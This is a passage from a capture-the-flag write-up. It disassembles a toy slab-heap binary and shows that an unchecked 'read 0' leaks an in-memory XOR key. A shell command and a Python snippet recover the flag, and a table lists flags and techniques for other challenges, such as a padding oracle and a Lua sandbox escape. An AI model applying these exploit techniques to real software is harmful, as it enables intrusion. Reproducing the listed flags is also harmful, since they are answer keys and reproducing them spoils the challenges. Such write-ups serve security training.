    # If it is not standard alloc command, it will try to free the memory (0x12b0)

    1267:	48 8b 4c 24 28       	mov    rcx,QWORD PTR [rsp+0x28]
    # rcx stores the alloc size
    126c:	48 8b 15 cd 2d 00 00 	mov    rdx,QWORD PTR [rip+0x2dcd]        # 4040 <stdin@GLIBC_2.2.5+0x10>
    # rdx stores the heap top
    1273:	48 8d 44 11 08       	lea    rax,[rcx+rdx*1+0x8]
    # new heap top = old heap top + alloc size + header size (0x8)
    1278:	48 3d 00 10 00 00    	cmp    rax,0x1000
    # compare the new heap top and max heap size 0x1000
    127e:	0f 87 78 02 00 00    	ja     14fc <__memset_chk@plt+0x3cc>
    # if it exceeds, then jump to 0x14fc (it will print error, handle=-1)
    1284:	89 4c 15 00          	mov    DWORD PTR [rbp+rdx*1+0x0],ecx
    # write first field `size` into header
    1288:	c7 44 15 04 01 00 00 	mov    DWORD PTR [rbp+rdx*1+0x4],0x1
    # write second field `in_use` as 1 into header
    128f:	00 
    1290:	48 89 05 a9 2d 00 00 	mov    QWORD PTR [rip+0x2da9],rax        # 4040 <stdin@GLIBC_2.2.5+0x10>
    # replace old heap top with new heap top
    1297:	48 8d 35 70 0d 00 00 	lea    rsi,[rip+0xd70]        # 200e <__memset_chk@plt+0xede>
    # rsi now points to the "handle=%d"
    129e:	bf 02 00 00 00       	mov    edi,0x2
    12a3:	31 c0                	xor    eax,eax
    12a5:	e8 76 fe ff ff       	call   1120 <__printf_chk@plt>
    # print "handle=rdx", here rdx is the old heap top
    12aa:	e9 41 ff ff ff       	jmp    11f0 <__memset_chk@plt+0xc0>
    # jump back

    <end: alloc>

    12af:	90                   	nop

    12b0:	31 c0                	xor    eax,eax
    # set eax to 0
    12b2:	48 8d 54 24 24       	lea    rdx,[rsp+0x24]
    12b7:	48 8d 35 5b 0d 00 00 	lea    rsi,[rip+0xd5b]        # 2019 <__memset_chk@plt+0xee9>
    # 0x2019 stores string "free %d", rsi points to the constant string
    12be:	48 8d bc 24 b0 00 00 	lea    rdi,[rsp+0xb0]
    12c5:	00 
    12c6:	e8 f5 fd ff ff       	call   10c0 <__isoc23_sscanf@plt>
    12cb:	83 f8 01             	cmp    eax,0x1
    12ce:	0f 84 8c 00 00 00    	je     1360 <__memset_chk@plt+0x230>
    # jump to free branch

    12d4:	31 c0                	xor    eax,eax
    12d6:	48 8d 4c 24 30       	lea    rcx,[rsp+0x30]
    12db:	48 8d 54 24 24       	lea    rdx,[rsp+0x24]
    12e0:	48 8d 35 3a 0d 00 00 	lea    rsi,[rip+0xd3a]        # 2021 <__memset_chk@plt+0xef1>
    # rsi points to constant string "write %d"
    12e7:	48 8d bc 24 b0 00 00 	lea    rdi,[rsp+0xb0]
    12ee:	00 
    12ef:	e8 cc fd ff ff       	call   10c0 <__isoc23_sscanf@plt>
    12f4:	83 f8 02             	cmp    eax,0x2
    12f7:	0f 84 e3 00 00 00    	je     13e0 <__memset_chk@plt+0x2b0>
    # jump to write branch

    12fd:	31 c0                	xor    eax,eax
    12ff:	48 8d 54 24 24       	lea    rdx,[rsp+0x24]
    1304:	48 8d 35 28 0d 00 00 	lea    rsi,[rip+0xd28]        # 2033 <__memset_chk@plt+0xf03>
    # rsi points to constant string "read %d"
    130b:	48 8d bc 24 b0 00 00 	lea    rdi,[rsp+0xb0]
    1312:	00 
    1313:	e8 a8 fd ff ff       	call   10c0 <__isoc23_sscanf@plt>
    1318:	83 f8 01             	cmp    eax,0x1
    131b:	0f 84 69 01 00 00    	je     148a <__memset_chk@plt+0x35a>
    # jump to read branch

    1321:	81 bc 24 b0 00 00 00 	cmp    DWORD PTR [rsp+0xb0],0x74697571
    # in little endian, 0x74697571 => 71 75 69 74 ("quit")
    # if user input is "quit" then return and finish the main function
    1328:	71 75 69 74 
    132c:	0f 85 be fe ff ff    	jne    11f0 <__memset_chk@plt+0xc0>
    1332:	48 8b 84 24 b8 01 00 	mov    rax,QWORD PTR [rsp+0x1b8]
    1339:	00 
    133a:	64 48 2b 04 25 28 00 	sub    rax,QWORD PTR fs:0x28
    # read the stack canary
    1341:	00 00 
    1343:	0f 85 bd 01 00 00    	jne    1506 <__memset_chk@plt+0x3d6>
    1349:	48 81 c4 c8 01 00 00 	add    rsp,0x1c8
    1350:	31 c0                	xor    eax,eax
    1352:	5b                   	pop    rbx
    1353:	5d                   	pop    rbp
    1354:	41 5c                	pop    r12
    1356:	41 5d                	pop    r13
    1358:	c3                   	ret
```

Above is the main logic of parsing user input and jumping branch. Next we will
check the write, free and read branch logic:

- **free branch**: `0x1360 ~ 0x13d5`

    ```asm
    1360:	48 63 44 24 24       	movsxd rax,DWORD PTR [rsp+0x24]
    # rax = index
    1365:	85 c0                	test   eax,eax
    1367:	0f 88 83 fe ff ff    	js     11f0 <__memset_chk@plt+0xc0>
    # if index < 0, it will return to the main loop
    136d:	3b 05 cd 2c 00 00    	cmp    eax,DWORD PTR [rip+0x2ccd]        # 4040 <stdin@GLIBC_2.2.5+0x10>
    1373:	0f 8d 77 fe ff ff    	jge    11f0 <__memset_chk@plt+0xc0>
    # if index >= heap top, also return to the main loop
    1379:	be 00 10 00 00       	mov    esi,0x1000
    137e:	ba 00 10 00 00       	mov    edx,0x1000
    1383:	4c 8d 64 05 00       	lea    r12,[rbp+rax*1+0x0]
    1388:	48 39 f0             	cmp    rax,rsi
    138b:	49 8d 7c 24 08       	lea    rdi,[r12+0x8]
    1390:	48 0f 43 f0          	cmovae rsi,rax
    1394:	48 89 f1             	mov    rcx,rsi
    1397:	48 29 c1             	sub    rcx,rax
    139a:	48 39 d1             	cmp    rcx,rdx
    139d:	48 0f 43 d1          	cmovae rdx,rcx
    13a1:	48 29 f0             	sub    rax,rsi
    13a4:	48 01 d0             	add    rax,rdx
    13a7:	48 0f 42 c2          	cmovb  rax,rdx
    13ab:	48 29 d1             	sub    rcx,rdx
    13ae:	48 01 c1             	add    rcx,rax
    13b1:	b8 00 00 00 00       	mov    eax,0x0
    13b6:	48 83 e9 08          	sub    rcx,0x8
    13ba:	48 0f 42 c8          	cmovb  rcx,rax
    13be:	41 8b 04 24          	mov    eax,DWORD PTR [r12]
    13c2:	31 f6                	xor    esi,esi
    13c4:	8d 50 01             	lea    edx,[rax+0x1]
    13c7:	e8 64 fd ff ff       	call   1130 <__memset_chk@plt>
    # memset(slab + index + 8, 0, size + 1)
    13cc:	41 c7 44 24 04 00 00 	mov    DWORD PTR [r12+0x4],0x0
    # *(uint32_t *)(slab + index + 4) = 0; // in_use = 0
    13d3:	00 00 
    13d5:	e9 16 fe ff ff       	jmp    11f0 <__memset_chk@plt+0xc0>
    ```

    Its C pseudocode is:

    ```c
    free(index):
        if (index < 0 || index >= heap_top) return;
        size = *(uint32_t *)(slab + index);
        memset(slab + index + 8, 0, size + 1);
        *(uint32_t *)(slab + index + 4) = 0;   // in_use = 0
    ```

- **write branch**: `0x13e0 ~ 0x1485`

    ```asm
    13e0:	8b 44 24 24          	mov    eax,DWORD PTR [rsp+0x24]
    13e4:	85 c0                	test   eax,eax
    13e6:	0f 88 04 fe ff ff    	js     11f0 <__memset_chk@plt+0xc0>
    # index < 0 
    13ec:	3b 05 4e 2c 00 00    	cmp    eax,DWORD PTR [rip+0x2c4e]        # 4040 <stdin@GLIBC_2.2.5+0x10>
    13f2:	0f 8d f8 fd ff ff    	jge    11f0 <__memset_chk@plt+0xc0>
    # index >= heap top
    13f8:	4c 63 e0             	movsxd r12,eax
    # r12 = index
    13fb:	4a 8d 54 25 00       	lea    rdx,[rbp+r12*1+0x0]
    # rdx = slab + index
    1400:	8b 42 04             	mov    eax,DWORD PTR [rdx+0x4]
    # eax = in_use
    1403:	85 c0                	test   eax,eax
    1405:	0f 84 e5 fd ff ff    	je     11f0 <__memset_chk@plt+0xc0>
    # in_use = 0, then go to the main loop
    140b:	b9 00 10 00 00       	mov    ecx,0x1000
    1410:	8b 32                	mov    esi,DWORD PTR [rdx]
    # esi = size (slab + index)
    1412:	48 8d 7c 24 30       	lea    rdi,[rsp+0x30]
    # rdi = text buffer
    1417:	48 89 54 24 08       	mov    QWORD PTR [rsp+0x8],rdx

    141c:	49 39 cc             	cmp    r12,rcx
    141f:	49 0f 43 cc          	cmovae rcx,r12
    1423:	49 89 c9             	mov    r9,rcx
    1426:	48 89 4c 24 18       	mov    QWORD PTR [rsp+0x18],rcx
    142b:	4d 29 e1             	sub    r9,r12
    142e:	4c 89 4c 24 10       	mov    QWORD PTR [rsp+0x10],r9
    1433:	e8 a8 fc ff ff       	call   10e0 <strnlen@plt>
    1438:	4c 8b 4c 24 10       	mov    r9,QWORD PTR [rsp+0x10]
    143d:	be 00 10 00 00       	mov    esi,0x1000
    1442:	48 8b 54 24 08       	mov    rdx,QWORD PTR [rsp+0x8]
    1447:	49 89 c0             	mov    r8,rax
    144a:	4c 89 e0             	mov    rax,r12
    144d:	49 39 f1             	cmp    r9,rsi
    1450:	48 8d 7a 08          	lea    rdi,[rdx+0x8]
    1454:	4c 89 c2             	mov    rdx,r8
    1457:	49 0f 43 f1          	cmovae rsi,r9
    145b:	48 2b 44 24 18       	sub    rax,QWORD PTR [rsp+0x18]
    1460:	48 01 f0             	add    rax,rsi
    1463:	48 0f 42 c6          	cmovb  rax,rsi
    1467:	49 29 f1             	sub    r9,rsi
    146a:	48 8d 74 24 30       	lea    rsi,[rsp+0x30]
    146f:	4a 8d 0c 08          	lea    rcx,[rax+r9*1]
    1473:	b8 00 00 00 00       	mov    eax,0x0
    1478:	48 83 e9 08          	sub    rcx,0x8
    147c:	48 0f 42 c8          	cmovb  rcx,rax
    1480:	e8 8b fc ff ff       	call   1110 <__memcpy_chk@plt>
    1485:	e9 66 fd ff ff       	jmp    11f0 <__memset_chk@plt+0xc0>
    ```

    Its C pseudocode is:

    ```c
    write(index, text):
        if (index < 0 || index >= heap_top) return;
        if (*(uint32_t *)(slab + index + 4) == 0) return;   // in_use == 0
        memcpy(slab + index + 8, text, strlen(text));
    ```

- **read branch**: `0x148a ~ 0x14f7`

    ```asm
    148a:	4c 63 6c 24 24       	movsxd r13,DWORD PTR [rsp+0x24]
    148f:	45 85 ed             	test   r13d,r13d
    1492:	0f 88 58 fd ff ff    	js     11f0 <__memset_chk@plt+0xc0>
    # index < 0
    1498:	44 3b 2d a1 2b 00 00 	cmp    r13d,DWORD PTR [rip+0x2ba1]        # 4040 <stdin@GLIBC_2.2.5+0x10>
    149f:	0f 8d 4b fd ff ff    	jge    11f0 <__memset_chk@plt+0xc0>
    # index >= heap_top, !!no in_use check
    14a5:	49 01 ed             	add    r13,rbp
    14a8:	45 31 e4             	xor    r12d,r12d
    14ab:	41 83 7d 00 00       	cmp    DWORD PTR [r13+0x0],0x0
    14b0:	74 34                	je     14e6 <__memset_chk@plt+0x3b6>
    # size = 0
    14b2:	0f 1f 00             	nop    DWORD PTR [rax]
    14b5:	66 66 2e 0f 1f 84 00 	data16 cs nop WORD PTR [rax+rax*1+0x0]
    14bc:	00 00 00 00 
    14c0:	44 89 e0             	mov    eax,r12d
    14c3:	48 8d 35 71 0b 00 00 	lea    rsi,[rip+0xb71]        # 203b <__memset_chk@plt+0xf0b>
    14ca:	bf 02 00 00 00       	mov    edi,0x2
    14cf:	41 83 c4 01          	add    r12d,0x1
    14d3:	41 0f b6 54 05 08    	movzx  edx,BYTE PTR [r13+rax*1+0x8]
    14d9:	31 c0                	xor    eax,eax
    14db:	e8 40 fc ff ff       	call   1120 <__printf_chk@plt>
    14e0:	45 3b 65 00          	cmp    r12d,DWORD PTR [r13+0x0]
    14e4:	72 da                	jb     14c0 <__memset_chk@plt+0x390>
    14e6:	48 8b 35 33 2b 00 00 	mov    rsi,QWORD PTR [rip+0x2b33]        # 4020 <stdout@GLIBC_2.2.5>
    14ed:	bf 0a 00 00 00       	mov    edi,0xa
    14f2:	e8 09 fc ff ff       	call   1100 <putc@plt>
    14f7:	e9 f4 fc ff ff       	jmp    11f0 <__memset_chk@plt+0xc0>
    ```

    `read <index>` takes a byte offset into the slab. Its checks are:

    ```c
    read(index):
        if (index < 0 || index >= heap_top) return;
            size = *(uint32_t *)(slab + index);
        if (size == 0) {
            putc('\n', stdout);
            return;
        }
        for (int i = 0; i < size; i++)
            printf("%02x", *(uint8_t *)(slab + index + 8 + i));
        putc('\n', stdout);
    ```

    It never checks that `index` is the start of a block, and it never checks the
    in-use flag. Because the key sits before the heap, `read 0` is accepted:
    `0 < 0x3b`. The "size" is then the first four key bytes, interpreted as a
    little-endian length, and the output begins at `slab + 8`.

    That leaks key bytes 8 through 58. The bogus length is enormous, so the
    process starts printing far past the slab; the solver reads the first 51
    bytes and kills it.

    ```console
    $ printf 'read 0\n' | ./heap | head -c 120
    12fbc91a0d8ff9d87fc209a0bc44e2ecace54b8c11f6166798600cefa1819a65ceca38d24d199dc1e6d7a4bdc3d1fc8d03d792000000000000000000
    ```

    For this instance the leaked tail is:

    ```text
    12fbc91a0d8ff9d87fc209a0bc44e2ecace54b8c11f6166798600cefa1819a65ceca38d24d199dc1e6d7a4bdc3d1fc8d03d792
    ```

### Recovering the first eight bytes

`read 0` starts at key byte 8, so the first eight key bytes are still
missing. They can be recovered from known plaintext: the flag starts with
`POCTF{13`, and the ciphertext is the 59-byte blob in `.rodata` at `0x2080`.

```python
key_prefix = bytes(c ^ p for c, p in zip(ciphertext, b"POCTF{13"))
key = key_prefix + leaked_tail
flag = bytes(c ^ k for c, k in zip(ciphertext, key))
```

The prefix check is enough because the first flag bytes are fixed by the
challenge. From there, XORing the full key with the ciphertext gives the flag.

### Flag

```text
POCTF{131.1619.fca89aa3f4077934.J5WUR3D3BOHL6XBJLOUNLAFCGK}
```

## Summary

| ID | Challenge | Technique | Flag |
|----|-----------|-----------|------|
| `crypto-01` | Letters Never Sent | Beaufort cipher, compass-rose key | `POCTF{2.1619.DDSVGT4WDHZ47VOL.KUJZW6I6WLD4AARQIBLXTGJ7HZ}` |
| `crypto-02` | Apparatus | Game-tree key recovery, printable-ASCII Vigenère | `POCTF{5.1619.BFNVVDUWGGVY4XRL.GBCZ7XM63RBP6YCC52GYYRHEXZ}` |
| `crypto-03` | The Consulting Room | CBC padding oracle over multiplexed HTTP/2 | `POCTF{72.1619.SJM23L4UOHQLVK2A.7T27T36CQJKWPXIV5KB5W5MTPF}` |
| `crypto-04` | A Map of Small Things | Supersingular curve, smooth order, Pohlig-Hellman | `POCTF{7402776758243033309}` |
| `crypto-07` | The Notary's Seal | Textbook RSA, low exponent, integer cube root | `POCTF{75.1619.QYL3A7E63L6VBSHC.ZJFJ4JO7TKGSPUFMGUUOGJGRR5}` |
| `crypto-08` | Forty Measures Deep | MIDI note cipher, musical alphabet | `POCTF{74.1619.57WBSCSK227RPRQB.WKBQSVVD5W5YN3Z25ININFJVDT}` |
| `exploit-01` | Read Me My Fortune | `str.format` attribute walk via `__globals__` | `POCTF{127.1619.IQGHFCSX77GP7HGI.F2WPFJSWTWGWOP542XVYQODEE4}` |
| `exploit-03` | The Sandglass | Lua sandbox escape, arbitrary file read via `io.open` | `POCTF{128.1619.687dd42ffb219159.H4NH7DMPZGZUPGEWF3UQSSIWCJ}` |
| `exploit-05` | What the Heap Remembers | Unchecked slab read leaks the in-memory XOR key, fixed method for generating key (MurmurHashV2 and LCG) | `POCTF{131.1619.fca89aa3f4077934.J5WUR3D3BOHL6XBJLOUNLAFCGK}` |
